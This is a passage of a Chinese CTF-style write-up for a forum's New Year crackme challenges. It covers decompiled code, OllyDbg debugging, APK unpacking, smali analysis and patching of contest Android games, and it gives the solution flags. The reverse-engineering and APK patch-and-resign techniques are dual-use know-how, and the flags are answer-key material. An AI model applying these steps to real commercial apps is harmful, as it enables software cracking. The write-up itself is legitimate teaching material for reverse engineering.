182);">int</span> v21; <span style="color: rgb(124, 124, 124);">// [esp+54h] [ebp-18h]</span><br />  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> v22; <span style="color: rgb(124, 124, 124);">// [esp+58h] [ebp-14h]</span><br />  <span style="color: rgb(255, 255, 182);">int</span> v23; <span style="color: rgb(124, 124, 124);">// [esp+68h] [ebp-4h]</span><br /><br />  Src[<span style="color: rgb(255, 115, 253);">4</span>] = <span style="color: rgb(255, 115, 253);">0</span>;<br />  v17 = <span style="color: rgb(255, 115, 253);">15</span>;<br />  LOBYTE(Src[<span style="color: rgb(255, 115, 253);">0</span>]) = <span style="color: rgb(255, 115, 253);">0</span>;<br />  sub_402560(Src, <span style="color: rgb(168, 255, 96);">"ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?"</span>, <span style="color: rgb(255, 115, 253);">0x24</span>u);<br />  v23 = <span style="color: rgb(255, 115, 253);">0</span>;<br />  SetConsoleTitleA(&amp;ConsoleTitle);<br />  v21 = <span style="color: rgb(255, 115, 253);">0</span>;<br />  v22 = <span style="color: rgb(255, 115, 253);">15</span>;<br />  LOBYTE(v20[<span style="color: rgb(255, 115, 253);">0</span>]) = <span style="color: rgb(255, 115, 253);">0</span>;<br />  LOBYTE(v23) = <span style="color: rgb(255, 115, 253);">1</span>;<br />  v3 = sub_4027D0();<br />  sub_402A80(v3);<br />  sub_4031E0(&amp;dword_42E088, v20);<br />  v4 = v22;<br />  v5 = (<span style="color: rgb(255, 255, 182);">void</span> **)v20[<span style="color: rgb(255, 115, 253);">0</span>];<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v21 == <span style="color: rgb(255, 115, 253);">36</span> )<br />  {<br />    sub_402490(Src);<br />    sub_401FE0();<br />    LOBYTE(v23) = <span style="color: rgb(255, 115, 253);">2</span>;<br />    v7 = Block;<br />    v8 = v20;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v19 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />      v7 = (<span style="color: rgb(255, 255, 182);">void</span> **)Block[<span style="color: rgb(255, 115, 253);">0</span>];<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v4 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />      v8 = v5;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( Block[<span style="color: rgb(255, 115, 253);">4</span>] == (<span style="color: rgb(255, 255, 182);">void</span> *)<span style="color: rgb(255, 115, 253);">36</span> )<br />    {<br />      v9 = <span style="color: rgb(255, 115, 253);">32</span>;<br />      <span style="color: rgb(150, 203, 254);">do</span><br />      {<br />        <span style="color: rgb(150, 203, 254);">if</span> ( *v8 != *v7 )<br />          <span style="color: rgb(150, 203, 254);">break</span>;<br />        ++v8;<br />        ++v7;<br />        v10 = v9 &lt; <span style="color: rgb(255, 115, 253);">4</span>;<br />        v9 -= <span style="color: rgb(255, 115, 253);">4</span>;<br />      }<br />      <span style="color: rgb(150, 203, 254);">while</span> ( !v10 );<br />    }<br />    v11 = sub_4027D0();<br />    sub_402A80(v11);<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v19 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />    {<br />      v12 = Block[<span style="color: rgb(255, 115, 253);">0</span>];<br />      <span style="color: rgb(150, 203, 254);">if</span> ( v19 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />      {<br />        v12 = (<span style="color: rgb(255, 255, 182);">void</span> *)*((_DWORD *)Block[<span style="color: rgb(255, 115, 253);">0</span>] - <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)(Block[<span style="color: rgb(255, 115, 253);">0</span>] - v12 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />          _invalid_parameter_noinfo_noreturn();<br />      }<br />      sub_406010(v12);<br />    }<br />    sub_40A6EE(<span style="color: rgb(168, 255, 96);">"Pause"</span>);<br />  }<br />  <span style="color: rgb(150, 203, 254);">else</span><br />  {<br />    v6 = sub_4027D0();<br />    sub_402A80(v6);<br />    sub_40A6EE(<span style="color: rgb(168, 255, 96);">"Pause"</span>);<br />  }<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v4 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />  {<br />    v13 = v5;<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v4 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />    {<br />      v5 = (<span style="color: rgb(255, 255, 182);">void</span> **)*(v5 - <span style="color: rgb(255, 115, 253);">1</span>);<br />      <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((<span style="color: rgb(255, 255, 182);">char</span> *)v13 - (<span style="color: rgb(255, 255, 182);">char</span> *)v5 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />        _invalid_parameter_noinfo_noreturn();<br />    }<br />    sub_406010(v5);<br />  }<br />  <span style="color: rgb(150, 203, 254);">if</span> ( v17 &gt;= <span style="color: rgb(255, 115, 253);">0x10</span> )<br />  {<br />    v14 = Src[<span style="color: rgb(255, 115, 253);">0</span>];<br />    <span style="color: rgb(150, 203, 254);">if</span> ( v17 + <span style="color: rgb(255, 115, 253);">1</span> &gt;= <span style="color: rgb(255, 115, 253);">0x1000</span> )<br />    {<br />      v14 = (<span style="color: rgb(255, 255, 182);">void</span> *)*((_DWORD *)Src[<span style="color: rgb(255, 115, 253);">0</span>] - <span style="color: rgb(255, 115, 253);">1</span>);<br />      <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)(Src[<span style="color: rgb(255, 115, 253);">0</span>] - v14 - <span style="color: rgb(255, 115, 253);">4</span>) &gt; <span style="color: rgb(255, 115, 253);">0x1F</span> )<br />        _invalid_parameter_noinfo_noreturn();<br />    }<br />    sub_406010(v14);<br />  }<br />  <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><h3>OD动态调试</h3><ol><li style="margin-left: 2px;"><p>打开OD，导入文件</p></li><li style="margin-left: 2px;"><p>使用中文搜索引擎，找到一个Success和两个Try again，以及一个Tip<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b4162062&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqr2n5OQzZy88iakvLQic3qVYMPZgSKDxPzLNEiaobgLlegSMA95H7nCvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />(Caesar Cipher恺撒密码......怪不得IDA看不懂）</p></li><li style="margin-left: 2px;"><p>先看看第一个Try again<br />上方有个cmp和je，也就是说比较当前字符串长度是否长为36，如果是的话就继续判断，否则就输出 "Error, please try again"<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=73bc8672&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKEnzYUqonndBWiaxYwCnOELoEUbdqqUEN6ia2DF4tpsZ7iauyfmtRAGWUA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />我们输入36个1，输出变为了"Wrong, please try again"，证明上述分析没有问题<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=57f8dfde&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK1OoOBmLbFiclda0uIUcy5yZHfWZxYg3XYU5Odo6Yhv24Iw49jSdhpjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>找到"Wrong, please try again"所在位置，找到判断条件，下断点，再次输入36个1，在MMX中即可找到CM的flag<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=97201390&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKNgRdYzTlqPvbOT3H3qtS3hDyq9Qg5Ric0Afv2y8HOStYo3dib9MJeHsA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ol><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!}</span></p></blockquote><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=17849376&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKhMjVvibcEA9LHibhn0GL1qwdPk1gogT9UzQObIRkpv4PialfYjmvTD9cA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之三 {Android 初级题}</h2><p><span style="font-weight: 700;">题目简介：小明和李华是同学，最近小明发现李华技术进步很快，他太想进步了，于是他一直在观察李华，却发现他老是在玩圈小猫，直到一次偶然发现，小明惊呼:“WC，原。。。”</span></p><h3>游戏</h3><p>大家一定玩过论坛的抓小猫吧（404界面），没玩过的也没事，现在打开链接也能玩【此处感谢Ganlv佬提供的游戏】<br />作为常在水区抓猫的“抓猫高手”，是时候展现真正的“寄”术了<br />（emmm，确实有些汗流浃背）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a8838440&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKFDYZdkMwFfGfO4q3x5RJa2XbPsu9NJ8oE3rtDQOsUmDvx8sKVM3Ixw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>Hacker（破解游戏，调低难度）</h3><p><span style="font-weight: 700;">用7-zip打开apk文件，发现里面有抓猫猫的主程序<code style="font-family: Consolas, Monaco, ;">catch-the-cat.js</code>，</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6150c048&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKicHHiaKyerlW6sKegVn7sLjhM7JtbprZVvG4cbYMvTQyw6U3SqHFKic3w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />这和论坛的抓猫游戏是一样诶，那就好办了<br />我们直接参照Ganlv佬的代码<br />修改一下抓猫猫的js主程序<code style="font-family: SFMono-Regular, Consolas, ;">catch-the-cat.js</code>，定位到变量<code style="font-family: SFMono-Regular, Consolas, ;">initialWallCount</code><br />把墙的数量改多一点，初始是10个所以抓不住，那么就把墙的数量改一下变成30吧（doge）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5242f994&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKur4IszG4BmdTLiaJO9UfJvw80WedDI330NxwpibggtJwVxRTyLNZUX6Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然后替换js文件，因为文件被修改过了，所以apk需要重新签名一下<br />这里采用Lucky Patcher，打个测试签名就行了，以下安卓部分修改后都用此方式打签名，不再重复赘述<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1b8bc28c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKscAQkFsPOXCoiatUsnYzFhib7IaOakeia81pPSv64NbnqiaQus338vBLaw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">“这下是谁该汗流浃背了呢......”</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=013e6a5f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK3HVgRk9FqY8lxR7gjVTaWPXvzkHXprYcqZYAbmsiadWZsPfibEEVW5iaw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>抓住猫，熟悉的bgm响起，看描述就猜到的标准结局......<br />“Genshin，Start！”<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=dda0f814&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK4T7SCyNd4AEOPbSKibicMXtAc6bkMKzU6vDaKX63do8agGibdzbrkg74w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f2f7f11b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9sR1KibXLdNXUx8bKVAyUME84B1LwyqibkZ8TF9h5KOwrf6ZiaeCuk0Zw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：flag{happy_new_year_2024}</span></p></blockquote><h3>Disassemble（反编译dex看函数）</h3><p>说完了上面的破解游戏本体，接下来就是直接对安装包本体下手了，上apktool<br />解包发现了一个以作者名字命名的文件夹，<br />里面有MainActivity和YSQDActivity（原神启动？）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=10e179c3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOqQr8uUzWQPViaDGNQibOkibCHQRlUiaJWBIYVUHQVgCOpTtQNSGT6mcCw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>分析：</p><ol><li style="margin-left: 2px;"><p>主进程调用Webview运行抓猫游戏<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5725dbbe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKXMn8iaPhnGQuo67qmCW8ia8EXEVzXsZ2wVyw1zd4U73NzfBbUsSlhSKw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>抓住猫以后播放ys.mp4<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0c47aff9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKW25BZ84AHjicbddF0pD0nibOPS7HsMQRlicj17fYkccAEwjMjboEg1TQg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>视频播放完以后用SetText显示Flag<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0e2e9398&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKntZYChW5iauzGekxzFYg4wzLas8L1qBEncC99sbsiczD2xKa3wsWqzvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ol><p>（最后的flag是通过字符操作得到的，没有直接给出，而在该文件中也没有提及具体操作步骤，猜想flag可能藏在那个播放的视频<code style="font-family: SFMono-Regular, Consolas, ;">ys.mp4</code>的文件末尾，因时间原因就不跟下去了）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d2d10725&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKL7hibVUiaibeV2wMqdKlUNpjYAwribpXxKblElPZHH6qYmTtPUhcPO7YRQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之四 {Android 初级题}</h2><p><span style="font-weight: 700;">寄语：如果不会解题还想拿分那赶紧来现学现卖吧，只要认真看完并动手练习，肯定能解出来本题，吾爱破解安卓逆向入门教程《安卓逆向这档事》。</span></p><h3>游戏</h3><p>第二个小游戏，居然是抽卡<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=776a41d3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKA9Z5KWTZ09Z8ibzbBHibvxUgibJWGRAwdFrp9kz83gIEBIPOY5mwXlrXg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />（吐槽一句：这0.6%概率真有点低啊......）</p><h3>BUG玩法</h3><p>这个程序没有采用数据库方式，<span style="font-weight: 700;">退出重新进入程序即刷新次数为10次</span><br /><span style="font-weight: 700;">于是乎，“只要我不停地抽，0.6%也不算什么”（doge）</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5b21f93a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKyMfC2fmLPKnmwbRU0KHDC5w6yeJyJo1xibwAFuGsxaQDia9Hq3ppM83A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：flag{52pj_HappyNewYear2024}</span></p></blockquote><h3>Hacker（破解游戏，调低难度）</h3><p><span style="font-weight: 700;">用英文含义命名Activity是个好习惯，至少对于CM而言是这样</span><br />用apktool反编译apk文件，在程序中，我们又发现了作者的信息<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ed6a6d0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKH01tfhh3oO4dGjfnwfY6MdRTDUvkuXBJdZzb258xj7mEn8sF9NsiaeQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>各位是否发现增加一抽所需要的时间在不断递增？我们简单修改一下增加一抽所需要时间（修改概率、保底同理，只要修改对应的数值就行了）<br /><span style="font-weight: 700;">将<code style="font-family: Consolas, Monaco, ;">array_1</code>中的数据全部改成0x1（即增加一抽仅需要1s），最坏情况下也只需要90s</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4a0d7627&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKWry1aPBwkxoYx2m5S4h0QJw2EsVmV5CnpyMLkNoR3rO033qLP5M0ug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>修改、编译一气呵成<span style="font-weight: 700;">（注意这时不要签名，因为flag在签名里面）</span>，直接核心破解安装即可，发现此时软件已经变成1秒增加1抽了（doge）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6973d6f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqY4y96BHN5lzljBBdy16djBjrqTbpoia7NMG12UkNXIlJe3X1Q6cg5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之五 {Android 中级题}</h2><p><span style="font-weight: 700;">题目简介：我，玄天帝，,解封！！！</span></p><h3>游戏</h3><p>emmm，九宫格图形解锁<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2ba09c7f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKgFoUDWIWUDSQUd8XcqnNLQE03ceSFXuicePGkIxxN8AtvCGbGGRRFfg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>运用强大的搜索引擎，找到了一个类似的开源项目GestureLock</p><p><span style="font-weight: 700;">小知识，安卓系统的图形是以数字密码形式存放在文件中的，所以推断该图形代表的也是一个数字字符串</span></p><h3>静态分析</h3><p>使用jde反编译得到一堆smali文件，打开以作者名字命名的文件夹</p><h4>GestureUnlock本体</h4><p>既然是游戏，那么我们就研究一下这款游戏的本体吧，找到以下定义：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">GestureUnlock</span>(Context context0, AttributeSet attributeSet0, <span style="color: rgb(255, 255, 182);">int</span> v) {<br />        super(context0, attributeSet0, v);<br />        this.cicleRadius = <span style="color: rgb(255, 115, 253);">10</span>;<br />        this.firstInit = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.points = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>();<br />        this.selectP = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>();<br />        this.alreadyTouch = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.isUp = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.lockTouch = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.returnFun = <span style="color: rgb(255, 115, 253);">0</span>;<br />        this.defaultKey = <span style="color: rgb(168, 255, 96);">"01234"</span>;<br />        this.setUpKey = <span style="color: rgb(168, 255, 96);">""</span>;<br />        this.errorKey = <span style="color: rgb(168, 255, 96);">""</span>;<br />}</code></pre><p>在MainActivity里面也没找到修改密码的Set函数，所以我们试试它的默认密码"01234"<br />嗯，看上去是对了，然后啥都没发生（我的flag呢！</p><p>【注意：此处为GestureUnlock（也就是这个密码锁）的密码，但不是Flag的密码，Flag的密码s在后续会说到】</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60c3b056&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOe9ibmcjD15m0QXNicEO5ZCR3FAU0xW7jgjQsoYgXZS9HLSxTODaEsFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>后续分析发现输入该密码时会进入函数<code style="font-family: SFMono-Regular, Consolas, ;">isSuccessful</code>，补充一句该函数是GestureUnlock自带密码正确的回调函数，但此题关键不在此处</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSuccessful</span>(String s) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />}</code></pre><p>而只有输入"错误"的密码才会进入真正的函数isError</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isError</span>(String s) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />    MainActivity.this.checkPassword(s); <span style="color: rgb(124, 124, 124);">//checkPassword是个很重要的函数，接下来就会说到</span><br />}</code></pre><h4>解密函数</h4><p>如上部分所述，在MainActivity中提及了一个重要的函数：<code style="font-family: SFMono-Regular, Consolas, ;">checkPassword</code>，先看它的smali code：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">.method</span><span style="color: rgb(150, 203, 254);"> public</span> checkPassword(String)Z<br />          .registers 11<br />00000000  const/4             v0, 0<span style="color: rgb(150, 203, 254);"><br />:try_2</span><br />00000002  invoke-virtual      MainActivity-&gt;getAssets()AssetManager, p0  <span style="color: rgb(124, 124, 124);">#读取Assets中的classes.dex</span><br />00000008  move-result-object  v1<br />0000000A  const-string        v2, <span style="color: rgb(168, 255, 96);">"classes.dex"</span><br />0000000E  invoke-virtual      AssetManager-&gt;open(String)InputStream, v1, v2<br />00000014  move-result-object  v1<br />00000016  invoke-virtual      InputStream-&gt;available()I, v1<br />0000001C  move-result         v2<br />0000001E  new-array           v2, v2, [B<br />00000022  invoke-virtual      InputStream-&gt;read([B)I, v1, v2<br />00000028  new-instance        v3, File<br />0000002C  const-string        v4, <span style="color: rgb(168, 255, 96);">"data"</span><br />00000030  invoke-virtual      MainActivity-&gt;getDir(String, I)File, p0, v4, v0<br />00000036  move-result-object  v4<br />00000038  const-string        v5, <span style="color: rgb(168, 255, 96);">"1.dex"</span><br />0000003C  invoke-direct       File-&gt;&lt;init&gt;(File, String)V, v3, v4, v5<br />00000042  new-instance        v4, FileOutputStream<br />00000046  invoke-direct       FileOutputStream-&gt;&lt;init&gt;(File)V, v4, v3<br />0000004C  invoke-virtual      FileOutputStream-&gt;write([B)V, v4, v2  <span style="color: rgb(124, 124, 124);">#将classes.dex释放至"/data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex"</span><br />00000052  invoke-virtual      FileOutputStream-&gt;close()V, v4<br />00000058  invoke-virtual      InputStream-&gt;close()V, v1<br />0000005E  const-string        v1, <span style="color: rgb(168, 255, 96);">"dex"</span><br />00000062  invoke-virtual      MainActivity-&gt;getDir(String, I)File, p0, v1, v0<br />00000068  move-result-object  v1<br />0000006A  invoke-virtual      Object-&gt;getClass()Class, p0<br />00000070  move-result-object  v2<br />00000072  invoke-virtual      Class-&gt;getClassLoader()ClassLoader, v2<br />00000078  move-result-object  v2<br />0000007A  new-instance        v4, DexClassLoader<br />0000007E  invoke-virtual      File-&gt;getAbsolutePath()String, v3<br />00000084  move-result-object  v3<br />00000086  